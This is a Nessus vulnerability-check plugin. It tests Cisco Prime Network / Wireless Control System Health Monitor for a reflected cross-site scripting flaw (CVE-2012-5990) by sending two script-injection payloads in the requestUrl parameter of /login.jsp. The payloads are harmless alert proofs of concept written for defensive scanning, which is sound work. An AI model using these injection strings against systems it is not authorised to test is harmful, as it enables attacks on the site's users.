#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69057);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2016/05/04 18:02:13 $");

  script_cve_id("CVE-2012-5990");
  script_bugtraq_id(62143);
  script_osvdb_id(96802);
  script_xref(name:"TRA", value:"TRA-2013-07");
  script_xref(name:"CERT", value:"830316");
  script_xref(name:"CISCO-BUG-ID", value:"CSCud18375");

  script_name(english:"Cisco Prime Network / Wireless Control System Health Monitor Reflected XSS");
  script_summary(english:"Attempts a reflected XSS PoC");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a cross-site scripting
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Health Monitor (a component of Cisco Prime Network /
Wireless Control System) hosted on the remote web server is affected
by a reflective cross-site scripting vulnerability.  Input to the
'requestUrl' parameter is not properly sanitized.  An attacker could
exploit this by tricking a user into requesting a specially crafted
URL, resulting in arbitrary script code execution."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2013-07");
  # http://tools.cisco.com/Support/BugToolKit/search/getBugDetails.do?method=fetchBugDetails&bugId=CSCud18375
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f19be7d6");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:UC");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  # it's not clear the exact date when CSCud18375 was created and made available
  # on Cisco's website, but both Cisco and CERT/CC said it was sometime in 2012
  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:prime_network_control_system");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("cisco_prime_ncs_health_monitor_detect.nasl");
  script_require_keys("www/prime_health_monitor");
  script_require_ports("Services/www", 8082);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8082);
install = get_install_from_kb(appname:'prime_health_monitor', port:port, exit_on_fail:TRUE);

dir = install['dir'];
cgi = '/login.jsp';
xss = "'/><script>alert(/" + SCRIPT_NAME + "/)</script>";
qs = 'requestUrl=' + xss;
expected_output = 'name="requestUrl" value=\'' + xss;

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:cgi,
  qs:qs,
  pass_str:expected_output,
  ctrl_re:'Health Monitor Login Page'
);

if (!exploited)
{
  xss = '"/><script>alert(/' + SCRIPT_NAME + '/)</script>';
  qs = 'requestUrl=' + xss;
  expected_output =  'name="requestUrl" value="' + xss;

  exploited = test_cgi_xss(
    port : port,
    dirs : make_list(dir),
    cgi  : cgi,
    qs   : qs,
    pass_str : expected_output,
    ctrl_re  : 'Health Monitor Login Page'
  );
}

if (!exploited)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Prime NCS / WCS Health Monitor', build_url(qs:dir+cgi, port:port));
